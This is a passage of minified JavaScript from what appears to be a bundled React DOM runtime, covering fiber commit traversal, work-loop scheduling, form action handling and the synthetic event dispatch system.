El(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&fa(e))}function Dl(e,t,n,r){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)Ol(e,t,n,r),t=t.sibling}function Ol(e,t,n,r){var i=t.flags;switch(t.tag){case 0:case 11:case 15:Dl(e,t,n,r),i&2048&&Hc(9,t);break;case 1:Dl(e,t,n,r);break;case 3:Dl(e,t,n,r),i&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&fa(e)));break;case 12:if(i&2048){Dl(e,t,n,r),e=t.stateNode;try{var a=t.memoizedProps,o=a.id,s=a.onPostCommit;typeof s==`function`&&s(o,t.alternate===null?`mount`:`update`,e.passiveEffectDuration,-0)}catch(e){Z(t,t.return,e)}}else Dl(e,t,n,r);break;case 31:Dl(e,t,n,r);break;case 13:Dl(e,t,n,r);break;case 23:break;case 22:a=t.stateNode,o=t.alternate,t.memoizedState===null?a._visibility&2?Dl(e,t,n,r):(a._visibility|=2,kl(e,t,n,r,!!(t.subtreeFlags&10256)||!1)):a._visibility&2?Dl(e,t,n,r):Al(e,t),i&2048&&Tl(o,t);break;case 24:Dl(e,t,n,r),i&2048&&El(t.alternate,t);break;default:Dl(e,t,n,r)}}function kl(e,t,n,r,i){for(i&&=!!(t.subtreeFlags&10256)||!1,t=t.child;t!==null;){var a=e,o=t,s=n,c=r,l=o.flags;switch(o.tag){case 0:case 11:case 15:kl(a,o,s,c,i),Hc(8,o);break;case 23:break;case 22:var u=o.stateNode;o.memoizedState===null?(u._visibility|=2,kl(a,o,s,c,i)):u._visibility&2?kl(a,o,s,c,i):Al(a,o),i&&l&2048&&Tl(o.alternate,o);break;case 24:kl(a,o,s,c,i),i&&l&2048&&El(o.alternate,o);break;default:kl(a,o,s,c,i)}t=t.sibling}}function Al(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var n=e,r=t,i=r.flags;switch(r.tag){case 22:Al(n,r),i&2048&&Tl(r.alternate,r);break;case 24:Al(n,r),i&2048&&El(r.alternate,r);break;default:Al(n,r)}t=t.sibling}}var jl=8192;function Ml(e,t,n){if(e.subtreeFlags&jl)for(e=e.child;e!==null;)Nl(e,t,n),e=e.sibling}function Nl(e,t,n){switch(e.tag){case 26:Ml(e,t,n),e.flags&jl&&e.memoizedState!==null&&Gf(n,vl,e.memoizedState,e.memoizedProps);break;case 5:Ml(e,t,n);break;case 3:case 4:var r=vl;vl=gf(e.stateNode.containerInfo),Ml(e,t,n),vl=r;break;case 22:e.memoizedState===null&&(r=e.alternate,r!==null&&r.memoizedState!==null?(r=jl,jl=16777216,Ml(e,t,n),jl=r):Ml(e,t,n));break;default:Ml(e,t,n)}}function Pl(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function Fl(e){var t=e.deletions;if(e.flags&16){if(t!==null)for(var n=0;n<t.length;n++){var r=t[n];al=r,Rl(r,e)}Pl(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)Il(e),e=e.sibling}function Il(e){switch(e.tag){case 0:case 11:case 15:Fl(e),e.flags&2048&&Uc(9,e,e.return);break;case 3:Fl(e);break;case 12:Fl(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,Ll(e)):Fl(e);break;default:Fl(e)}}function Ll(e){var t=e.deletions;if(e.flags&16){if(t!==null)for(var n=0;n<t.length;n++){var r=t[n];al=r,Rl(r,e)}Pl(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:Uc(8,t,t.return),Ll(t);break;case 22:n=t.stateNode,n._visibility&2&&(n._visibility&=-3,Ll(t));break;default:Ll(t)}e=e.sibling}}function Rl(e,t){for(;al!==null;){var n=al;switch(n.tag){case 0:case 11:case 15:Uc(8,n,t);break;case 23:case 22:if(n.memoizedState!==null&&n.memoizedState.cachePool!==null){var r=n.memoizedState.cachePool.pool;r!=null&&r.refCount++}break;case 24:fa(n.memoizedState.cache)}if(r=n.child,r!==null)r.return=n,al=r;else a:for(n=e;al!==null;){r=al;var i=r.sibling,a=r.return;if(cl(r),r===n){al=null;break a}if(i!==null){i.return=a,al=i;break a}al=a}}}var zl={getCacheForType:function(e){var t=aa(I),n=t.data.get(e);return n===void 0&&(n=e(),t.data.set(e,n)),n},cacheSignal:function(){return aa(I).controller.signal}},Bl=typeof WeakMap==`function`?WeakMap:Map,W=0,G=null,K=null,q=0,J=0,Vl=null,Hl=!1,Ul=!1,Wl=!1,Gl=0,Kl=0,ql=0,Jl=0,Yl=0,Xl=0,Zl=0,Ql=null,$l=null,eu=!1,tu=0,nu=0,ru=1/0,iu=null,Y=null,X=0,au=null,ou=null,su=0,cu=0,lu=null,uu=null,du=0,fu=null;function pu(){return W&2&&q!==0?q&-q:D.T===null?lt():dd()}function mu(){if(Xl===0){if(!(q&536870912)||F){var e=Je;Je<<=1,!(Je&3932160)&&(Je=262144),Xl=e}else Xl=536870912}return e=oo.current,e!==null&&(e.flags|=32),Xl}function hu(e,t,n){(e===G&&(J===2||J===9)||e.cancelPendingCommit!==null)&&(Su(e,0),yu(e,q,Xl,!1)),nt(e,n),(!(W&2)||e!==G)&&(e===G&&(!(W&2)&&(Jl|=n),Kl===4&&yu(e,q,Xl,!1)),rd(e))}function gu(e,t,n){if(W&6)throw Error(i(327));var r=!n&&!(t&127)&&(t&e.expiredLanes)===0||Qe(e,t),a=r?Au(e,t):Ou(e,t,!0),o=r;do{if(a===0){Ul&&!r&&yu(e,t,0,!1);break}if(n=e.current.alternate,o&&!vu(n)){a=Ou(e,t,!1),o=!1;continue}if(a===2){if(o=t,e.errorRecoveryDisabledLanes&o)var s=0;else s=e.pendingLanes&-536870913,s=s===0?s&536870912?536870912:0:s;if(s!==0){t=s;a:{var c=e;a=Ql;var l=c.current.memoizedState.isDehydrated;if(l&&(Su(c,s).flags|=256),s=Ou(c,s,!1),s!==2){if(Wl&&!l){c.errorRecoveryDisabledLanes|=o,Jl|=o,a=4;break a}o=$l,$l=a,o!==null&&($l===null?$l=o:$l.push.apply($l,o))}a=s}if(o=!1,a!==2)continue}}if(a===1){Su(e,0),yu(e,t,0,!0);break}a:{switch(r=e,o=a,o){case 0:case 1:throw Error(i(345));case 4:if((t&4194048)!==t)break;case 6:yu(r,t,Xl,!Hl);break a;case 2:$l=null;break;case 3:case 5:break;default:throw Error(i(329))}if((t&62914560)===t&&(a=tu+300-je(),10<a)){if(yu(r,t,Xl,!Hl),Ze(r,0,!0)!==0)break a;su=t,r.timeoutHandle=Kd(_u.bind(null,r,n,$l,iu,eu,t,Xl,Jl,Zl,Hl,o,`Throttled`,-0,0),a);break a}_u(r,n,$l,iu,eu,t,Xl,Jl,Zl,Hl,o,null,-0,0)}break}while(1);rd(e)}function _u(e,t,n,r,i,a,o,s,c,l,u,d,f,p){if(e.timeoutHandle=-1,d=t.subtreeFlags,d&8192||(d&16785408)==16785408){d={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:an},Nl(t,a,d);var m=(a&62914560)===a?tu-je():(a&4194048)===a?nu-je():0;if(m=qf(d,m),m!==null){su=a,e.cancelPendingCommit=m(Lu.bind(null,e,t,a,n,r,i,o,s,c,u,d,null,f,p)),yu(e,a,o,!l);return}}Lu(e,t,a,n,r,i,o,s,c)}function vu(e){for(var t=e;;){var n=t.tag;if((n===0||n===11||n===15)&&t.flags&16384&&(n=t.updateQueue,n!==null&&(n=n.stores,n!==null)))for(var r=0;r<n.length;r++){var i=n[r],a=i.getSnapshot;i=i.value;try{if(!Dr(a(),i))return!1}catch{return!1}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function yu(e,t,n,r){t&=~Yl,t&=~Jl,e.suspendedLanes|=t,e.pingedLanes&=~t,r&&(e.warmLanes|=t),r=e.expirationTimes;for(var i=t;0<i;){var a=31-Ue(i),o=1<<a;r[a]=-1,i&=~o}n!==0&&it(e,n,t)}function bu(){return W&6?!0:(id(0,!1),!1)}function xu(){if(K!==null){if(J===0)var e=K.return;else e=K,Zi=Xi=null,Oo(e),Fa=null,Ia=0,e=K;for(;e!==null;)Vc(e.alternate,e),e=e.return;K=null}}function Su(e,t){var n=e.timeoutHandle;n!==-1&&(e.timeoutHandle=-1,qd(n)),n=e.cancelPendingCommit,n!==null&&(e.cancelPendingCommit=null,n()),su=0,xu(),G=e,K=n=mi(e.current,null),q=t,J=0,Vl=null,Hl=!1,Ul=Qe(e,t),Wl=!1,Zl=Xl=Yl=Jl=ql=Kl=0,$l=Ql=null,eu=!1,t&8&&(t|=t&32);var r=e.entangledLanes;if(r!==0)for(e=e.entanglements,r&=t;0<r;){var i=31-Ue(r),a=1<<i;t|=e[i],r&=~a}return Gl=t,ii(),n}function Cu(e,t){H=null,D.H=Rs,t===Ta||t===Da?(t=Na(),J=3):t===Ea?(t=Na(),J=4):J=t===nc?8:typeof t==`object`&&t&&typeof t.then==`function`?6:1,Vl=t,K===null&&(Kl=1,Xs(e,Si(t,e.current)))}function wu(){var e=oo.current;return e===null?!0:(q&4194048)===q?L===null:(q&62914560)===q||q&536870912?e===L:!1}function Tu(){var e=D.H;return D.H=Rs,e===null?Rs:e}function Eu(){var e=D.A;return D.A=zl,e}function Du(){Kl=4,Hl||(q&4194048)!==q&&oo.current!==null||(Ul=!0),!(ql&134217727)&&!(Jl&134217727)||G===null||yu(G,q,Xl,!1)}function Ou(e,t,n){var r=W;W|=2;var i=Tu(),a=Eu();(G!==e||q!==t)&&(iu=null,Su(e,t)),t=!1;var o=Kl;a:do try{if(J!==0&&K!==null){var s=K,c=Vl;switch(J){case 8:xu(),o=6;break a;case 3:case 2:case 9:case 6:oo.current===null&&(t=!0);var l=J;if(J=0,Vl=null,Pu(e,s,c,l),n&&Ul){o=0;break a}break;default:l=J,J=0,Vl=null,Pu(e,s,c,l)}}ku(),o=Kl;break}catch(t){Cu(e,t)}while(1);return t&&e.shellSuspendCounter++,Zi=Xi=null,W=r,D.H=i,D.A=a,K===null&&(G=null,q=0,ii()),o}function ku(){for(;K!==null;)Mu(K)}function Au(e,t){var n=W;W|=2;var r=Tu(),a=Eu();G!==e||q!==t?(iu=null,ru=je()+500,Su(e,t)):Ul=Qe(e,t);a:do try{if(J!==0&&K!==null){t=K;var o=Vl;b:switch(J){case 1:J=0,Vl=null,Pu(e,t,o,1);break;case 2:case 9:if(ka(o)){J=0,Vl=null,Nu(t);break}t=function(){J!==2&&J!==9||G!==e||(J=7),rd(e)},o.then(t,t);break a;case 3:J=7;break a;case 4:J=5;break a;case 7:ka(o)?(J=0,Vl=null,Nu(t)):(J=0,Vl=null,Pu(e,t,o,7));break;case 5:var s=null;switch(K.tag){case 26:s=K.memoizedState;case 5:case 27:var c=K;if(s?Wf(s):c.stateNode.complete){J=0,Vl=null;var l=c.sibling;if(l!==null)K=l;else{var u=c.return;u===null?K=null:(K=u,Fu(u))}break b}}J=0,Vl=null,Pu(e,t,o,5);break;case 6:J=0,Vl=null,Pu(e,t,o,6);break;case 8:xu(),Kl=6;break a;default:throw Error(i(462))}}ju();break}catch(t){Cu(e,t)}while(1);return Zi=Xi=null,D.H=r,D.A=a,W=n,K===null?(G=null,q=0,ii(),Kl):0}function ju(){for(;K!==null&&!j();)Mu(K)}function Mu(e){var t=Mc(e.alternate,e,Gl);e.memoizedProps=e.pendingProps,t===null?Fu(e):K=t}function Nu(e){var t=e,n=t.alternate;switch(t.tag){case 15:case 0:t=gc(n,t,t.pendingProps,t.type,void 0,q);break;case 11:t=gc(n,t,t.pendingProps,t.type.render,t.ref,q);break;case 5:Oo(t);default:Vc(n,t),t=K=hi(t,Gl),t=Mc(n,t,Gl)}e.memoizedProps=e.pendingProps,t===null?Fu(e):K=t}function Pu(e,t,n,r){Zi=Xi=null,Oo(t),Fa=null,Ia=0;var i=t.return;try{if(tc(e,i,t,n,q)){Kl=1,Xs(e,Si(n,e.current)),K=null;return}}catch(t){if(i!==null)throw K=i,t;Kl=1,Xs(e,Si(n,e.current)),K=null;return}t.flags&32768?(F||r===1?e=!0:Ul||q&536870912?e=!1:(Hl=e=!0,(r===2||r===9||r===3||r===6)&&(r=oo.current,r!==null&&r.tag===13&&(r.flags|=16384))),Iu(t,e)):Fu(t)}function Fu(e){var t=e;do{if(t.flags&32768){Iu(t,Hl);return}e=t.return;var n=zc(t.alternate,t,Gl);if(n!==null){K=n;return}if(t=t.sibling,t!==null){K=t;return}K=t=e}while(t!==null);Kl===0&&(Kl=5)}function Iu(e,t){do{var n=Bc(e.alternate,e);if(n!==null){n.flags&=32767,K=n;return}if(n=e.return,n!==null&&(n.flags|=32768,n.subtreeFlags=0,n.deletions=null),!t&&(e=e.sibling,e!==null)){K=e;return}K=e=n}while(e!==null);Kl=6,K=null}function Lu(e,t,n,r,a,o,s,c,l){e.cancelPendingCommit=null;do Hu();while(X!==0);if(W&6)throw Error(i(327));if(t!==null){if(t===e.current)throw Error(i(177));if(o=t.lanes|t.childLanes,o|=ri,rt(e,n,o,s,c,l),e===G&&(K=G=null,q=0),ou=t,au=e,su=n,cu=o,lu=a,uu=r,t.subtreeFlags&10256||t.flags&10256?(e.callbackNode=null,e.callbackPriority=0,Xu(Fe,function(){return Uu(),null})):(e.callbackNode=null,e.callbackPriority=0),r=!!(t.flags&13878),t.subtreeFlags&13878||r){r=D.T,D.T=null,a=O.p,O.p=2,s=W,W|=4;try{ol(e,t,n)}finally{W=s,O.p=a,D.T=r}}X=1,Ru(),zu(),Bu()}}function Ru(){if(X===1){X=0;var e=au,t=ou,n=!!(t.flags&13878);if(t.subtreeFlags&13878||n){n=D.T,D.T=null;var r=O.p;O.p=2;var i=W;W|=4;try{yl(t,e);var a=zd,o=Mr(e.containerInfo),s=a.focusedElem,c=a.selectionRange;if(o!==s&&s&&s.ownerDocument&&jr(s.ownerDocument.documentElement,s)){if(c!==null&&Nr(s)){var l=c.start,u=c.end;if(u===void 0&&(u=l),`selectionStart`in s)s.selectionStart=l,s.selectionEnd=Math.min(u,s.value.length);else{var d=s.ownerDocument||document,f=d&&d.defaultView||window;if(f.getSelection){var p=f.getSelection(),m=s.textContent.length,h=Math.min(c.start,m),g=c.end===void 0?h:Math.min(c.end,m);!p.extend&&h>g&&(o=g,g=h,h=o);var _=Ar(s,h),v=Ar(s,g);if(_&&v&&(p.rangeCount!==1||p.anchorNode!==_.node||p.anchorOffset!==_.offset||p.focusNode!==v.node||p.focusOffset!==v.offset)){var y=d.createRange();y.setStart(_.node,_.offset),p.removeAllRanges(),h>g?(p.addRange(y),p.extend(v.node,v.offset)):(y.setEnd(v.node,v.offset),p.addRange(y))}}}}for(d=[],p=s;p=p.parentNode;)p.nodeType===1&&d.push({element:p,left:p.scrollLeft,top:p.scrollTop});for(typeof s.focus==`function`&&s.focus(),s=0;s<d.length;s++){var b=d[s];b.element.scrollLeft=b.left,b.element.scrollTop=b.top}}sp=!!Rd,zd=Rd=null}finally{W=i,O.p=r,D.T=n}}e.current=t,X=2}}function zu(){if(X===2){X=0;var e=au,t=ou,n=!!(t.flags&8772);if(t.subtreeFlags&8772||n){n=D.T,D.T=null;var r=O.p;O.p=2;var i=W;W|=4;try{sl(e,t.alternate,t)}finally{W=i,O.p=r,D.T=n}}X=3}}function Bu(){if(X===4||X===3){X=0,M();var e=au,t=ou,n=su,r=uu;t.subtreeFlags&10256||t.flags&10256?X=5:(X=0,ou=au=null,Vu(e,e.pendingLanes));var i=e.pendingLanes;if(i===0&&(Y=null),ct(n),t=t.stateNode,Ve&&typeof Ve.onCommitFiberRoot==`function`)try{Ve.onCommitFiberRoot(Be,t,void 0,(t.current.flags&128)==128)}catch{}if(r!==null){t=D.T,i=O.p,O.p=2,D.T=null;try{for(var a=e.onRecoverableError,o=0;o<r.length;o++){var s=r[o];a(s.value,{componentStack:s.stack})}}finally{D.T=t,O.p=i}}su&3&&Hu(),rd(e),i=e.pendingLanes,n&261930&&i&42?e===fu?du++:(du=0,fu=e):du=0,id(0,!1)}}function Vu(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,fa(t)))}function Hu(){return Ru(),zu(),Bu(),Uu()}function Uu(){if(X!==5)return!1;var e=au,t=cu;cu=0;var n=ct(su),r=D.T,a=O.p;try{O.p=32>n?32:n,D.T=null,n=lu,lu=null;var o=au,s=su;if(X=0,ou=au=null,su=0,W&6)throw Error(i(331));var c=W;if(W|=4,Il(o.current),Ol(o,o.current,s,n),W=c,id(0,!1),Ve&&typeof Ve.onPostCommitFiberRoot==`function`)try{Ve.onPostCommitFiberRoot(Be,o)}catch{}return!0}finally{O.p=a,D.T=r,Vu(e,t)}}function Wu(e,t,n){t=Si(n,t),t=Qs(e.stateNode,t,2),e=qa(e,t,2),e!==null&&(nt(e,2),rd(e))}function Z(e,t,n){if(e.tag===3)Wu(e,e,n);else for(;t!==null;){if(t.tag===3){Wu(t,e,n);break}if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError==`function`||typeof r.componentDidCatch==`function`&&(Y===null||!Y.has(r))){e=Si(n,e),n=$s(2),r=qa(t,n,2),r!==null&&(ec(n,r,t,e),nt(r,2),rd(r));break}}t=t.return}}function Gu(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new Bl;var i=new Set;r.set(t,i)}else i=r.get(t),i===void 0&&(i=new Set,r.set(t,i));i.has(n)||(Wl=!0,i.add(n),e=Ku.bind(null,e,t,n),t.then(e,e))}function Ku(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),e.pingedLanes|=e.suspendedLanes&n,e.warmLanes&=~n,G===e&&(q&n)===n&&(Kl===4||Kl===3&&(q&62914560)===q&&300>je()-tu?!(W&2)&&Su(e,0):Yl|=n,Zl===q&&(Zl=0)),rd(e)}function qu(e,t){t===0&&(t=et()),e=si(e,t),e!==null&&(nt(e,t),rd(e))}function Ju(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),qu(e,n)}function Yu(e,t){var n=0;switch(e.tag){case 31:case 13:var r=e.stateNode,a=e.memoizedState;a!==null&&(n=a.retryLane);break;case 19:r=e.stateNode;break;case 22:r=e.stateNode._retryCache;break;default:throw Error(i(314))}r!==null&&r.delete(t),qu(e,n)}function Xu(e,t){return Ae(e,t)}var Zu=null,Qu=null,$u=!1,ed=!1,td=!1,nd=0;function rd(e){e!==Qu&&e.next===null&&(Qu===null?Zu=Qu=e:Qu=Qu.next=e),ed=!0,$u||($u=!0,ud())}function id(e,t){if(!td&&ed){td=!0;do for(var n=!1,r=Zu;r!==null;){if(!t){if(e!==0){var i=r.pendingLanes;if(i===0)var a=0;else{var o=r.suspendedLanes,s=r.pingedLanes;a=(1<<31-Ue(42|e)+1)-1,a&=i&~(o&~s),a=a&201326741?a&201326741|1:a?a|2:0}a!==0&&(n=!0,ld(r,a))}else a=q,a=Ze(r,r===G?a:0,r.cancelPendingCommit!==null||r.timeoutHandle!==-1),!(a&3)||Qe(r,a)||(n=!0,ld(r,a))}r=r.next}while(n);td=!1}}function ad(){od()}function od(){ed=$u=!1;var e=0;nd!==0&&Gd()&&(e=nd);for(var t=je(),n=null,r=Zu;r!==null;){var i=r.next,a=sd(r,t);a===0?(r.next=null,n===null?Zu=i:n.next=i,i===null&&(Qu=n)):(n=r,(e!==0||a&3)&&(ed=!0)),r=i}X!==0&&X!==5||id(e,!1),nd!==0&&(nd=0)}function sd(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,i=e.expirationTimes,a=e.pendingLanes&-62914561;0<a;){var o=31-Ue(a),s=1<<o,c=i[o];c===-1?((s&n)===0||(s&r)!==0)&&(i[o]=$e(s,t)):c<=t&&(e.expiredLanes|=s),a&=~s}if(t=G,n=q,n=Ze(e,e===t?n:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),r=e.callbackNode,n===0||e===t&&(J===2||J===9)||e.cancelPendingCommit!==null)return r!==null&&r!==null&&A(r),e.callbackNode=null,e.callbackPriority=0;if(!(n&3)||Qe(e,n)){if(t=n&-n,t===e.callbackPriority)return t;switch(r!==null&&A(r),ct(n)){case 2:case 8:n=Pe;break;case 32:n=Fe;break;case 268435456:n=Le;break;default:n=Fe}return r=cd.bind(null,e),n=Ae(n,r),e.callbackPriority=t,e.callbackNode=n,t}return r!==null&&r!==null&&A(r),e.callbackPriority=2,e.callbackNode=null,2}function cd(e,t){if(X!==0&&X!==5)return e.callbackNode=null,e.callbackPriority=0,null;var n=e.callbackNode;if(Hu()&&e.callbackNode!==n)return null;var r=q;return r=Ze(e,e===G?r:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),r===0?null:(gu(e,r,t),sd(e,je()),e.callbackNode!=null&&e.callbackNode===n?cd.bind(null,e):null)}function ld(e,t){if(Hu())return null;gu(e,t,!0)}function ud(){Yd(function(){W&6?Ae(Ne,ad):od()})}function dd(){if(nd===0){var e=ha;e===0&&(e=qe,qe<<=1,!(qe&261888)&&(qe=256)),nd=e}return nd}function fd(e){return e==null||typeof e==`symbol`||typeof e==`boolean`?null:typeof e==`function`?e:rn(``+e)}function pd(e,t){var n=t.ownerDocument.createElement(`input`);return n.name=t.name,n.value=t.value,e.id&&n.setAttribute(`form`,e.id),t.parentNode.insertBefore(n,t),e=new FormData(e),n.parentNode.removeChild(n),e}function md(e,t,n,r,i){if(t===`submit`&&n&&n.stateNode===i){var a=fd((i[ft]||null).action),o=r.submitter;o&&(t=(t=o[ft]||null)?fd(t.formAction):o.getAttribute(`formAction`),t!==null&&(a=t,o=null));var s=new En(`action`,`action`,null,r,i);e.push({event:s,listeners:[{instance:null,listener:function(){if(r.defaultPrevented){if(nd!==0){var e=o?pd(i,o):new FormData(i);ws(n,{pending:!0,data:e,method:i.method,action:a},null,e)}}else typeof a==`function`&&(s.preventDefault(),e=o?pd(i,o):new FormData(i),ws(n,{pending:!0,data:e,method:i.method,action:a},a,e))},currentTarget:i}]})}}for(var hd=0;hd<Qr.length;hd++){var gd=Qr[hd];$r(gd.toLowerCase(),`on`+(gd[0].toUpperCase()+gd.slice(1)))}$r(Gr,`onAnimationEnd`),$r(Kr,`onAnimationIteration`),$r(P,`onAnimationStart`),$r(`dblclick`,`onDoubleClick`),$r(`focusin`,`onFocus`),$r(`focusout`,`onBlur`),$r(qr,`onTransitionRun`),$r(Jr,`onTransitionStart`),$r(Yr,`onTransitionCancel`),$r(Xr,`onTransitionEnd`),Ot(`onMouseEnter`,[`mouseout`,`mouseover`]),Ot(`onMouseLeave`,[`mouseout`,`mouseover`]),Ot(`onPointerEnter`,[`pointerout`,`pointerover`]),Ot(`onPointerLeave`,[`pointerout`,`pointerover`]),Dt(`onChange`,`change click focusin focusout input keydown keyup selectionchange`.split(` `)),Dt(`onSelect`,`focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange`.split(` `)),Dt(`onBeforeInput`,[`compositionend`,`keypress`,`textInput`,`paste`]),Dt(`onCompositionEnd`,`compositionend focusout keydown keypress keyup mousedown`.split(` `)),Dt(`onCompositionStart`,`compositionstart focusout keydown keypress keyup mousedown`.split(` `)),Dt(`onCompositionUpdate`,`compositionupdate focusout keydown keypress keyup mousedown`.split(` `));var _d=`abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting`.split(` `),vd=new Set(`beforetoggle cancel close invalid load scroll scrollend toggle`.split(` `).concat(_d));function yd(e,t){t=!!(t&4);for(var n=0;n<e.length;n++){var r=e[n],i=r.event;r=r.listeners;a:{var a=void 0;if(t)for(var o=r.length-1;0<=o;o--){var s=r[o],c=s.instance,l=s.currentTarget;if(s=s.listener,c!==a&&i.isPropagationStopped())break a;a=s,i.currentTarget=l;try{a(i)}catch(e){ei(e)}i.currentTarget=null,a=c}else for(o=0;o<r.length;o++){if(s=r[o],c=s.instance,l=s.currentTarget,s=s.listener,c!==a&&i.isPropagationStopped())break a;a=s,i.currentTarget=l;try{a(i)}catch(e){ei(e)}i.currentTarget=null,a=c}}}}function Q(e,t){var n=t[mt];n===void 0&&(n=t[mt]=new Set);var r=e+`__bubble`;n.has(r)||(Cd(t,e,2,!1),n.add(r))}function bd(e,t,n){var r=0;t&&(r|=4),Cd(n,e,r,t)}var xd=`_reactListening`+Math.random().toString(36).slice(2);function Sd(e){if(!e[xd]){e[xd]=!0,Tt.forEach(function(t){t!==`selectionchange`&&(vd.has(t)||bd(t,!1,e),bd(t,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[xd]||(t[xd]=!0,bd(`selectionchange`,!1,t))}}function Cd(e,t,n,r){switch(mp(t)){case 2:var i=cp;break;case 8:i=lp;break;default:i=up}n=i.bind(null,t,n,e),i=void 0,!hn||t!==`touchstart`&&t!==`touchmove`&&t!==`wheel`||(i=!0),r?i===void 0?e.addEventListener(t,n,!0):e.addEventListener(t,n,{capture:!0,passive:i}):i===void 0?e.addEventListener(t,n,!1):e.addEventListener(t,n,{passive:i})}function wd(e,t,n,r,i){var a=r;if(!(t&1)&&!(t&2)&&r!==null)a:for(;;){if(r===null)return;var s=r.tag;if(s===3||s===4){var c=r.stateNode.containerInfo;if(c===i)break;if(s===4)for(s=r.return;s!==null;){var l=s.tag;if((l===3||l===4)&&s.stateNode.containerInfo===i)return;s=s.return}for(;c!==null;){if(s=bt(c),s===null)return;if(l=s.tag,l===5||l===6||l===26||l===27){r=a=s;continue a}c=c.parentNode}}r=r.return}fn(function(){var r=a,i=sn(n),s=[];a:{var c=Zr.get(e);if(c!==void 0){var l=En,u=e;switch(e){case`keypress`:if(xn(n)===0)break a;case`keydown`:case`keyup`:l=Wn;break;case`focusin`:u=`focus`,l=Fn;break;case`focusout`:u=`blur`,l=Fn;break;case`beforeblur`:case`afterblur`:l=Fn;break;case`click`:if(n.button===2)break a;case`auxclick`:case`dblclick`:case`mousedown`:case`mousemove`:case`mouseup`:case`mouseout`:case`mouseover`:case`contextmenu`:l=Nn;break;case`drag`:case`dragend`:case`dragenter`:case`dragexit`:case`dragleave`:case`dragover`:case`dragstart`:case`drop`:l=Pn;break;case`touchcancel`:case`touchend`:case`touchmove`:case`touchstart`:l=Kn;break;case Gr:case Kr:case P:l=In;break;case Xr:l=qn;break;case`scroll`:case`scrollend`:l=On;break;case`wheel`:l=Jn;break;case`copy`:case`cut`:case`paste`:l=Ln;break;case`gotpointercapture`:case`lostpointercapture`:case`pointercancel`:case`pointerdown`:case`pointermove`:case`pointerout`:case`pointerover`:case`pointerup`:l=Gn;break;case`toggle`:case`beforetoggle`:l=Yn}var d=!!(t&4),f=!d&&(e===`scroll`||e===`scrollend`),p=d?c===null?null:c+`Capture`:c;d=[];for(var m=r,h;m!==null;){var g=m;if(h=g.stateNode,g=g.tag,g!==5&&g!==26&&g!==27||h===null||p===null||(g=pn(m,p),g!=null&&d.push(Td(m,g,h))),f)break;m=m.return}0<d.length&&(c=new l(c,u,null,n,i),s.push({event:c,listeners:d}))}}if(!(t&7)){a:{if(c=e===`mouseover`||e===`pointerover`,l=e===`mouseout`||e===`pointerout`,c&&n!==on&&(u=n.relatedTarget||n.fromElement)&&(bt(u)||u[pt]))break a;if((l||c)&&(c=i.window===i?i:(c=i.ownerDocument)?c.defaultView||c.parentWindow:window,l?(u=n.relatedTarget||n.toElement,l=r,u=u?bt(u):null,u!==null&&(f=o(u),d=u.tag,u!==f||d!==5&&d!==27&&d!==6)&&(u=null)):(l=null,u=r),l!==u)){if(d=Nn,g=`onMouseLeave`,p=`onMouseEnter`,m=`mouse`,(e===`pointerout`||e===`pointerover`)&&(d=Gn,g=`onPointerLeave`,p=`onPointerEnter`,m=`pointer`),f=l==null?c:St(l),h=u==null?c:St(u),c=new d(g,m+`leave`,l,n,i),c.target=f,c.relatedTarget=h,g=null,bt(i)===r&&(d=new d(p,m+`enter`,u,n,i),d.target=h,d.relatedTarget=f,g=d),f=g,l&&u)b:{for(d=Dd,p=l,m=u,h=0,g=p;g;g=d(g))h++;g=0;for(var _=m;_;_=d(_))g++;for(;0<h-g;)p=d(p),h--;for(;0<g-h;)m=d(m),g--;for(;h--;){if(p===m||m!==null&&p===m.alternate){d=p;break b}p=d(p),m=d(m)}d=null}else d=null;l!==null&&Od(s,c,l,d,!1),u!==null&&f!==null&&Od(s,f,u,d,!0)}}a:{if(c=r?St(r):window,l=c.nodeName&&c.nodeName.toLowerCase(),l===`select`||l===`input`&&c.type===`file`)var v=hr;else if(lr(c)){if(gr)v=Tr;else{v=Cr;var y=Sr}}else l=c.nodeName,!l||l.toLowerCase()!==`input`||c.type!==`checkbox`&&c.type!==`radio`?r&&en(r.elementType)&&(v=hr):v=wr;if(v&&=v(e,r)){ur(s,v,n,i);break a}y&&y(e,c,r),e===`focusout`&&r&&c.type===`number`&&r.memoizedProps.value!=null&&Kt(c,`number`,c.value)}switch(y=r?St(r):window,e){case`focusin`:(lr(y)||y.contentEditable===`true`)&&(Fr=y,Ir=r,Lr=null);break;case`focusout`:Lr=Ir=Fr=null;break;case`mousedown`:Rr=!0;break;case`contextmenu`:case`mouseup`:case`dragend`:Rr=!1,zr(s,n,i);break;case`selectionchange`:if(Pr)break;case`keydown`:case`keyup`:zr(s,n,i)}var b;if(Zn)b:{switch(e){case`compositionstart`:var x=`onCompositionStart`;break 